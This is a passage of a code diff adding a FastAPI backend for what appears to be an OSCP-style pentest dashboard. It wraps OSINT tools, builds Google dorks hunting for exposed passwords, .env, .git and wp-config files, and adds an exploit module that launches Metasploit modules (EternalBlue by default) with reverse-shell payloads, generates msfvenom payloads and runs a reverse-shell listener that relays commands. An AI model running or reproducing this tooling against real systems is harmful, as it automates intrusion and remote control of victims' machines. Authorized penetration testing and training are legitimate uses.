+        f"modules load recon/domains-hosts/certificate_transparency\n"
+        f"options set SOURCE {host}\nrun\n"
+        f"modules load recon/domains-hosts/hackertarget\n"
+        f"options set SOURCE {host}\nrun\n"
+        f"show hosts\nexit\n"
+    )
+    with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as f:
+        f.write(script); path = f.name
+    try:
+        result = await run_tool(["recon-ng", "-r", path], timeout=180)
+    finally:
+        try: _os.unlink(path)
+        except: pass
+    out = result.get("output", "")
+    hosts = list(set(re.findall(r"[a-zA-Z0-9\-\.]+\." + re.escape(host), out)))
+    hosts = [h for h in hosts if h != host and not h.startswith(".")]
+    scan_id = str(uuid.uuid4()); save_scan(scan_id, "recon_ng", req.target, result)
+    return {"scan_id":scan_id,"target":req.target,"tool":"recon_ng",
+            "hosts":hosts[:50],"raw_output":out[:3000],
+            "timestamp":datetime.datetime.utcnow().isoformat()}
+
+@app.post("/api/osint/spiderfoot")
+async def osint_spiderfoot(req: ScanRequest, user=Depends(verify_token)):
+    host = _recon_host(req.target)
+    result = await run_tool(
+        ["python3", "-m", "spiderfoot.cli", "-s", host,
+         "-t", "INTERNET_NAME,IP_ADDRESS,EMAILADDR",
+         "-m", "sfp_dnsresolve,sfp_googlesearch,sfp_dnsbrute"],
+        timeout=180
+    )
+    out = result.get("output", "")
+    if not out.strip() or "No module" in out:
+        result2 = await run_tool(["sfcli.py", "-s", host, "-t", "INTERNET_NAME,IP_ADDRESS,EMAILADDR"], timeout=180)
+        out = result2.get("output", out)
+    emails = list(set(re.findall(r"[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}", out)))
+    ips    = list(set(re.findall(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", out)))
+    hosts  = list(set(re.findall(r"[a-zA-Z0-9\-]+\." + re.escape(host), out)))
+    scan_id = str(uuid.uuid4()); save_scan(scan_id, "spiderfoot", req.target, result)
+    return {"scan_id":scan_id,"target":req.target,"tool":"spiderfoot",
+            "emails":emails[:30],"ips":ips[:20],"hosts":hosts[:30],"raw_output":out[:3000],
+            "timestamp":datetime.datetime.utcnow().isoformat()}
+
+@app.post("/api/osint/virustotal")
+async def osint_virustotal(req: ScanRequest, user=Depends(verify_token)):
+    api_key = req.api_key or os.getenv("VIRUSTOTAL_KEY", "")
+    if not api_key:
+        return {"scan_id":str(uuid.uuid4()),"target":req.target,"tool":"virustotal",
+                "error":"No VirusTotal API key — add it in Settings","timestamp":datetime.datetime.utcnow().isoformat()}
+    host = _recon_host(req.target)
+    try:
+        import urllib.request
+        is_ip = bool(re.match(r"^\d{1,3}(?:\.\d{1,3}){3}$", host))
+        url = f"https://www.virustotal.com/api/v3/{'ip_addresses' if is_ip else 'domains'}/{host}"
+        vt_req = urllib.request.Request(url, headers={"x-apikey": api_key})
+        with urllib.request.urlopen(vt_req, timeout=15) as resp:
+            data = json.loads(resp.read())
+        attrs = data.get("data",{}).get("attributes",{})
+        stats = attrs.get("last_analysis_stats",{})
+        malicious  = stats.get("malicious",0)
+        suspicious = stats.get("suspicious",0)
+        scan_id = str(uuid.uuid4())
+        return {"scan_id":scan_id,"target":req.target,"tool":"virustotal",
+                "malicious":malicious,"suspicious":suspicious,
+                "harmless":stats.get("harmless",0),"total_engines":sum(stats.values()),
+                "reputation":attrs.get("reputation",0),
+                "categories":list(attrs.get("categories",{}).values())[:5],
+                "tags":attrs.get("tags",[])[:5],
+                "threat_detected":malicious>0 or suspicious>0,
+                "timestamp":datetime.datetime.utcnow().isoformat()}
+    except Exception as e:
+        return {"scan_id":str(uuid.uuid4()),"target":req.target,"tool":"virustotal",
+                "error":str(e),"timestamp":datetime.datetime.utcnow().isoformat()}
+
+@app.post("/api/osint/abuseipdb")
+async def osint_abuseipdb(req: ScanRequest, user=Depends(verify_token)):
+    api_key = req.api_key or os.getenv("ABUSEIPDB_KEY", "")
+    host = _recon_host(req.target)
+    if not re.match(r"^\d{1,3}(?:\.\d{1,3}){3}$", host):
+        try:
+            import socket; host = socket.gethostbyname(host)
+        except: pass
+    if not api_key:
+        return {"scan_id":str(uuid.uuid4()),"target":req.target,"tool":"abuseipdb","ip":host,
+                "error":"No AbuseIPDB API key — add it in Settings","timestamp":datetime.datetime.utcnow().isoformat()}
+    try:
+        import urllib.request, urllib.parse
+        url = f"https://api.abuseipdb.com/api/v2/check?ipAddress={urllib.parse.quote(host)}&maxAgeInDays=90"
+        r = urllib.request.Request(url, headers={"Key":api_key,"Accept":"application/json"})
+        with urllib.request.urlopen(r, timeout=15) as resp:
+            d = json.loads(resp.read()).get("data",{})
+        scan_id = str(uuid.uuid4())
+        return {"scan_id":scan_id,"target":req.target,"tool":"abuseipdb","ip":host,
+                "abuse_score":d.get("abuseConfidenceScore",0),
+                "total_reports":d.get("totalReports",0),
+                "country":d.get("countryCode",""),"isp":d.get("isp",""),
+                "domain":d.get("domain",""),"is_whitelisted":d.get("isWhitelisted",False),
+                "threat_detected":d.get("abuseConfidenceScore",0)>25,
+                "timestamp":datetime.datetime.utcnow().isoformat()}
+    except Exception as e:
+        return {"scan_id":str(uuid.uuid4()),"target":req.target,"tool":"abuseipdb",
+                "ip":host,"error":str(e),"timestamp":datetime.datetime.utcnow().isoformat()}
+
+@app.post("/api/osint/geoip")
+async def osint_geoip(req: ScanRequest, user=Depends(verify_token)):
+    host = _recon_host(req.target)
+    import urllib.request, socket as _sock
+    try:
+        ip = host
+        if not re.match(r"^\d{1,3}(?:\.\d{1,3}){3}$", host):
+            try: ip = _sock.gethostbyname(host)
+            except: ip = host
+        with urllib.request.urlopen(
+            f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,zip,lat,lon,timezone,isp,org,as,query,reverse",
+            timeout=10
+        ) as resp:
+            data = json.loads(resp.read())
+        if data.get("status") == "fail":
+            raise Exception(data.get("message","ip-api failed"))
+        scan_id = str(uuid.uuid4())
+        return {"scan_id":scan_id,"target":req.target,"tool":"geoip",
+                "ip":data.get("query",ip),"city":data.get("city",""),
+                "region":data.get("regionName",""),"country":data.get("country",""),
+                "org":data.get("org","") or data.get("isp",""),
+                "timezone":data.get("timezone",""),
+                "loc":f"{data.get('lat','')},{data.get('lon','')}",
+                "hostname":data.get("reverse",""),
+                "isp":data.get("isp",""),"as_info":data.get("as",""),
+                "timestamp":datetime.datetime.utcnow().isoformat()}
+    except Exception:
+        try:
+            with urllib.request.urlopen(f"https://ipinfo.io/{host}/json", timeout=10) as resp:
+                data = json.loads(resp.read())
+            scan_id = str(uuid.uuid4())
+            return {"scan_id":scan_id,"target":req.target,"tool":"geoip",
+                    "ip":data.get("ip",host),"city":data.get("city",""),
+                    "region":data.get("region",""),"country":data.get("country",""),
+                    "org":data.get("org",""),"timezone":data.get("timezone",""),
+                    "loc":data.get("loc",""),"hostname":data.get("hostname",""),
+                    "timestamp":datetime.datetime.utcnow().isoformat()}
+        except Exception as e2:
+            return {"scan_id":str(uuid.uuid4()),"target":req.target,"tool":"geoip",
+                    "error":str(e2),"timestamp":datetime.datetime.utcnow().isoformat()}
+
+@app.post("/api/osint/sherlock")
+async def osint_sherlock(req: ScanRequest, user=Depends(verify_token)):
+    t = req.target.strip()
+    # Extract bare username — reject if it looks like an IP, domain, or URL
+    if t.startswith("http://") or t.startswith("https://"):
+        from urllib.parse import urlparse as _up
+        t = _up(t).hostname or t
+    username = t.lstrip("@").split("/")[-1].split("?")[0].strip()
+    is_ip = bool(re.match(r"^\d{1,3}(?:\.\d{1,3}){3}$", username))
+    is_domain = bool(re.match(r"^[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}$", username)) and not is_ip
+    if not username or len(username) < 2 or is_ip or is_domain:
+        return {"scan_id":str(uuid.uuid4()),"target":req.target,"tool":"sherlock",
+                "error":"Sherlock requires a username — not an IP or domain",
+                "username":"","accounts_found":[],"total":0,
+                "timestamp":datetime.datetime.utcnow().isoformat()}
+    result = await run_tool(["sherlock", username, "--timeout", "5", "--print-found"], timeout=120)
+    out = result.get("output", "")
+    found = [line.split("[+]")[-1].strip() for line in out.splitlines() if "[+]" in line and "http" in line]
+    scan_id = str(uuid.uuid4()); save_scan(scan_id, "sherlock", req.target, result)
+    return {"scan_id":scan_id,"target":req.target,"tool":"sherlock",
+            "username":username,"accounts_found":found[:50],"total":len(found),
+            "raw_output":out[:3000],"timestamp":datetime.datetime.utcnow().isoformat()}
+
+@app.post("/api/osint/hibp")
+async def osint_hibp(req: ScanRequest, user=Depends(verify_token)):
+    host = _recon_host(req.target)
+    try:
+        import urllib.request
+        url = f"https://haveibeenpwned.com/api/v3/breacheddomain/{host}"
+        r = urllib.request.Request(url, headers={"User-Agent":"oscp-dashboard","hibp-api-key":req.api_key or ""})
+        try:
+            with urllib.request.urlopen(r, timeout=10) as resp:
+                data = json.loads(resp.read())
+            emails = list(data.keys())[:50]
+            scan_id = str(uuid.uuid4())
+            return {"scan_id":scan_id,"target":req.target,"tool":"hibp","checked":True,
+                    "breaches":emails,"total":len(emails),"timestamp":datetime.datetime.utcnow().isoformat()}
+        except urllib.error.HTTPError as e:
+            if e.code == 404:
+                return {"scan_id":str(uuid.uuid4()),"target":req.target,"tool":"hibp","checked":True,
+                        "breaches":[],"total":0,"timestamp":datetime.datetime.utcnow().isoformat()}
+            if e.code == 401:
+                return {"scan_id":str(uuid.uuid4()),"target":req.target,"tool":"hibp","checked":True,
+                        "error":"HIBP API key required — get free key at haveibeenpwned.com/API/Key",
+                        "breaches":[],"timestamp":datetime.datetime.utcnow().isoformat()}
+            raise
+    except Exception as e:
+        return {"scan_id":str(uuid.uuid4()),"target":req.target,"tool":"hibp","checked":True,
+                "error":str(e),"breaches":[],"timestamp":datetime.datetime.utcnow().isoformat()}
+
+@app.post("/api/osint/dnstwist")
+async def osint_dnstwist(req: ScanRequest, user=Depends(verify_token)):
+    host = _recon_host(req.target)
+    result = await run_tool(["dnstwist", "--format", "json", "--registered", host], timeout=120)
+    out = result.get("output", "")
+    domains = []
+    try:
+        start = out.find("[")
+        if start != -1:
+            domains = json.loads(out[start:])
+    except:
+        pass
+    if not domains:
+        result2 = await run_tool(["dnstwist", "--format", "json", host], timeout=120)
+        out2 = result2.get("output", "")
+        try:
+            start = out2.find("[")
+            if start != -1:
+                raw = json.loads(out2[start:])
+                domains = [d for d in raw if d.get("dns-a") or d.get("dns_a")]
+        except:
+            pass
+    clean = []
+    for d in domains[:50]:
+        clean.append({
+            "domain": d.get("domain",""),
+            "fuzzer": d.get("fuzzer",""),
+            "dns_a":  d.get("dns-a", d.get("dns_a",[])),
+        })
+    scan_id = str(uuid.uuid4()); save_scan(scan_id, "dnstwist", req.target, result)
+    return {"scan_id":scan_id,"target":req.target,"tool":"dnstwist",
+            "domains":clean,"total":len(clean),
+            "raw_output":out[:2000],"timestamp":datetime.datetime.utcnow().isoformat()}
+
+@app.post("/api/osint/googledorks")
+async def osint_googledorks(req: ScanRequest, user=Depends(verify_token)):
+    host = _recon_host(req.target)
+    dorks = [
+        f'site:{host} filetype:pdf',
+        f'site:{host} filetype:xls OR filetype:xlsx OR filetype:csv',
+        f'site:{host} filetype:sql OR filetype:bak OR filetype:backup',
+        f'site:{host} inurl:admin OR inurl:login OR inurl:dashboard',
+        f'site:{host} inurl:config OR inurl:setup OR inurl:install',
+        f'site:{host} intext:password OR intext:"api_key" OR intext:"secret"',
+        f'site:{host} inurl:".env" OR inurl:".git" OR inurl:"wp-config"',
+        f'site:{host} inurl:phpinfo OR inurl:phpinfo.php',
+        f'site:{host} intitle:"index of" OR intitle:"directory listing"',
+        f'site:{host} intext:"sql syntax" OR intext:"mysql error" OR intext:"ORA-"',
+        f'site:{host} ext:log OR ext:txt inurl:log',
+        f'"{host}" site:pastebin.com OR site:paste.ee OR site:hastebin.com',
+        f'"{host}" site:github.com password OR secret OR api_key',
+        f'"{host}" intext:"@{host}" email list',
+        f'related:{host}',
+    ]
+    scan_id = str(uuid.uuid4())
+    return {"scan_id":scan_id,"target":req.target,"tool":"googledorks",
+            "dorks":dorks,"total":len(dorks),"timestamp":datetime.datetime.utcnow().isoformat()}
+
+@app.post("/api/osint/maltego")
+async def osint_maltego(req: ScanRequest, user=Depends(verify_token)):
+    host = _recon_host(req.target)
+    guide = f"""Maltego CE Guide for: {host}
+
+1. Open Maltego CE -> New Graph
+2. Drag a 'Domain' entity -> type '{host}'
+3. Right-click -> Run Transforms:
+   - To DNS Name [All]        -> discovers subdomains
+   - To IP Address [DNS]      -> resolves IPs
+   - To Website [DNS]         -> finds related sites
+   - To MX Record [DNS]       -> finds mail servers
+4. On each IP found:
+   - To Netblock [Owner]      -> finds IP ranges
+   - To AS Number             -> finds hosting provider
+5. On each email/person found:
+   - To Social Media Profiles -> finds social accounts
+
+Key transforms for {host}:
+  paterva.com/maltego-ce/ — free community edition
+  Transforms: DNS, Shodan, HaveIBeenPwned, Twitter
+"""
+    scan_id = str(uuid.uuid4())
+    return {"scan_id":scan_id,"target":req.target,"tool":"maltego",
+            "guide":guide,"host":host,"timestamp":datetime.datetime.utcnow().isoformat()}
+
+
+# ═══════════════════════════════════════════════════════════════
+#  EXPLOIT MODULE
+# ═══════════════════════════════════════════════════════════════
+
+class ExploitRequest(BaseModel):
+    target:         str = ""
+    port:           int = 445
+    lhost:          str = ""
+    lport:          int = 4444
+    msf_module:     str = ""
+    msf_payload:    str = "windows/x64/shell_reverse_tcp"
+    payload_format: str = "exe"
+    query:          str = ""
+    extra_opts:     str = ""
+
+EXPLOIT_SESSIONS: dict = {}
+
+
+@app.post("/api/exploit/search")
+async def exploit_search(req: ExploitRequest, user=Depends(verify_token)):
+    q = req.query.strip() or (req.msf_module.split("/")[-1] if req.msf_module else "") or "ms17-010"
+    result = await run_tool(["searchsploit", "--json", q], timeout=30)
+    out = result.get("output", "")
+    exploits = []
+    try:
+        import json as _json
+        data = _json.loads(out)
+        for e in (data.get("RESULTS_EXPLOIT") or data.get("RESULTS_SHELLCODE") or []):
+            exploits.append({
+                "title": e.get("Title",""),
+                "path":  e.get("Path",""),
+                "type":  e.get("Type",""),
+                "date":  e.get("Date",""),
+                "edb":   e.get("EDB-ID",""),
+            })
+    except Exception:
+        for line in out.splitlines():
+            if "|" in line and "Title" not in line and "---" not in line:
+                parts = [p.strip() for p in line.split("|")]
+                if len(parts) >= 2:
+                    exploits.append({"title": parts[0], "path": parts[-1]})
+    return {"query": q, "total": len(exploits), "exploits": exploits, "raw_output": out}
+
+
+@app.post("/api/exploit/vulncheck")
+async def exploit_vulncheck(req: ExploitRequest, user=Depends(verify_token)):
+    host = _recon_host(req.target) if req.target else req.target
+    port = str(req.port) if req.port else "445"
+    result = await run_tool(
+        ["nmap", "-p", port, "--script", "vuln,exploit", "-T4", "--open", host],
+        timeout=180
+    )
+    out = result.get("output", "")
+    vulns = []
+    for line in out.splitlines():
+        l = line.strip()
+        if any(k in l for k in ["CVE-","VULNERABLE","exploitable","vuln"]):
+            vulns.append({"detail": l})
+    return {"target": req.target, "port": req.port, "total": len(vulns), "vulns": vulns, "raw_output": out}
+
+
+async def _auto_detect_payload(module: str, preferred: str = "") -> str:
+    """Query msfconsole show payloads and pick best compatible one."""
+    rc_path = f"/tmp/msf_pl_{uuid.uuid4().hex}.rc"
+    with open(rc_path, "w") as f:
+        f.write(f"use {module}\nshow payloads\nexit -y\n")
+    try:
+        result = await run_tool(["msfconsole", "-q", "-r", rc_path], timeout=60)
+    finally:
+        try: os.remove(rc_path)
+        except: pass
+    out = result.get("output", "")
+    payloads = []
+    for line in out.splitlines():
+        m = re.match(r'\s*\d+\s+([\w/]+)\s+', line)
+        if m:
+            payloads.append(m.group(1))
+    if not payloads:
+        return preferred
+    if preferred in payloads:
+        return preferred
+    # For backdoor modules prefer interact (no reverse connection needed)
+    if "backdoor" in module or "ircd" in module:
+        for p in payloads:
+            if "interact" in p:
+                return p
+    # Prefer shell_reverse_tcp > meterpreter for reliability
+    for p in payloads:
+        if "shell_reverse_tcp" in p:
+            return p
+    for p in payloads:
+        if "reverse" in p:
+            return p
+    return payloads[0]
+
+
+@app.post("/api/exploit/msf")
+async def exploit_msf(req: ExploitRequest, user=Depends(verify_token)):
+    host = _recon_host(req.target) if req.target else req.target
+    if not host:
+        return {"error": "Target required"}
+    if not req.lhost:
+        return {"error": "LHOST required"}
+    module  = req.msf_module  or "exploit/windows/smb/ms17_010_eternalblue"
+    # Auto-detect the right payload for this module
+    payload = await _auto_detect_payload(module, req.msf_payload or "")
+    if not payload:
+        payload = req.msf_payload or "windows/x64/shell_reverse_tcp"
+    # interact/bind payloads don't use LHOST/LPORT
+    is_reverse = not any(x in payload for x in ["interact", "bind", "find_tag"])
+    lhost_block = f"set LHOST {req.lhost}\nset LPORT {req.lport}\n" if is_reverse and req.lhost else ""
+    rc = (
+        f"use {module}\n"
+        f"set RHOSTS {host}\n"
+        f"set RPORT {req.port}\n"
+        + lhost_block +
+        f"set PAYLOAD {payload}\n"
+        f"set ExitOnSession false\n"
+        f"run -j\n"
+        f"sleep 25\n"
+        f"sessions -l\n"
+        f"exit -y\n"
+    )
+    rc_path = f"/tmp/msf_{uuid.uuid4().hex}.rc"
+    with open(rc_path, "w") as f:
+        f.write(rc)
+    result = await run_tool(["msfconsole", "-q", "-r", rc_path], timeout=90)
+    try:
+        os.remove(rc_path)
+    except:
+        pass
+    out = result.get("output", "")
+    session_opened = "Meterpreter session" in out or "Command shell session" in out or "session 1 opened" in out.lower()
+    error = None
+    for line in out.splitlines():
+        if "[-]" in line or "Error" in line or "failed" in line.lower():
+            error = line.strip()
+            break
+    return {
+        "target": req.target, "module": module, "payload": payload,
+        "session_opened": session_opened, "error": error,
+        "raw_output": out
+    }
+
+
+@app.post("/api/exploit/payload")
+async def exploit_payload(req: ExploitRequest, user=Depends(verify_token)):
+    if not req.lhost:
+        return {"error": "LHOST required"}
+    payload = req.msf_payload or "windows/x64/shell_reverse_tcp"
+    fmt     = req.payload_format or "exe"
+    out_file = f"/tmp/payload_{uuid.uuid4().hex}.{fmt}"
+    cmd = [
+        "msfvenom", "-p", payload,
+        f"LHOST={req.lhost}", f"LPORT={req.lport}",
+        "-f", fmt, "-o", out_file
+    ]
+    result = await run_tool(cmd, timeout=60)
+    out = result.get("output", "")
+    size = None
+    size_m = re.search(r"Payload size:\s*(\d+) bytes", out)
+    if size_m:
+        size = int(size_m.group(1))
+    try:
+        os.remove(out_file)
+    except:
+        pass
+    return {
+        "payload": payload, "format": fmt,
+        "lhost": req.lhost, "lport": req.lport,
+        "size": size, "raw_output": out,
+        "message": f"Payload generated: {size} bytes ({fmt})" if size else out.strip()
+    }
+
+
+@app.post("/api/exploit/shell/start")
+async def exploit_shell_start(req: ExploitRequest, user=Depends(verify_token)):
+    lport = req.lport or 4444
+    lid   = f"exp_shell_{lport}"
+    if lid in EXPLOIT_SESSIONS:
+        try:
+            if EXPLOIT_SESSIONS[lid].server: EXPLOIT_SESSIONS[lid].server.close()
+            if EXPLOIT_SESSIONS[lid].writer: EXPLOIT_SESSIONS[lid].writer.close()
+        except: pass
+    try:
+        subprocess.run(["fuser", "-k", f"{lport}/tcp"], capture_output=True)
+    except FileNotFoundError:
+        try:
+            subprocess.run(["pkill", "-f", f":{lport}"], capture_output=True)
+        except Exception:
+            pass
+    except Exception:
+        pass
+    await asyncio.sleep(0.5)
+    session = _ShellSession(lid, lport)
+    EXPLOIT_SESSIONS[lid] = session
+    try:
+        server = await asyncio.start_server(
+            lambda r, w: _shell_handler(r, w, lid, EXPLOIT_SESSIONS),
+            "0.0.0.0", lport, reuse_port=True)
+        session.server = server
+        asyncio.create_task(server.serve_forever())
+        return {"lid": lid, "port": lport, "status": "waiting", "ok": True,
+                "message": f"Listener ready on port {lport}"}
+    except Exception as e:
+        return {"error": str(e), "lid": lid, "ok": False}
+
+
+@app.get("/api/exploit/shell/{lid}/output")
+async def exploit_shell_output(lid: str, user=Depends(verify_token)):
+    s = EXPLOIT_SESSIONS.get(lid)
+    if not s: return {"output": "", "status": "not_found"}
+    out = "".join(s.output); s.output = []
+    return {"output": out, "status": s.status}
+
+
+@app.post("/api/exploit/shell/{lid}/cmd")
+async def exploit_shell_cmd(lid: str, body: dict, user=Depends(verify_token)):
+    s = EXPLOIT_SESSIONS.get(lid)
+    if not s or not s.writer: return {"error": "No shell connected"}
+    try:
+        cmd = body.get("cmd", "")
+        s.writer.write((cmd + "\n").encode())
+        await s.writer.drain()
+        return {"sent": True}
+    except Exception as e:
+        return {"error": str(e)}
+
+
+@app.post("/api/exploit/shell/{lid}/stop")
+async def exploit_shell_stop(lid: str, user=Depends(verify_token)):
+    s = EXPLOIT_SESSIONS.pop(lid, None)
+    if s:
+        try:
+            if s.server: s.server.close()
+            if s.writer: s.writer.close()
+        except: pass
+    return {"stopped": True}
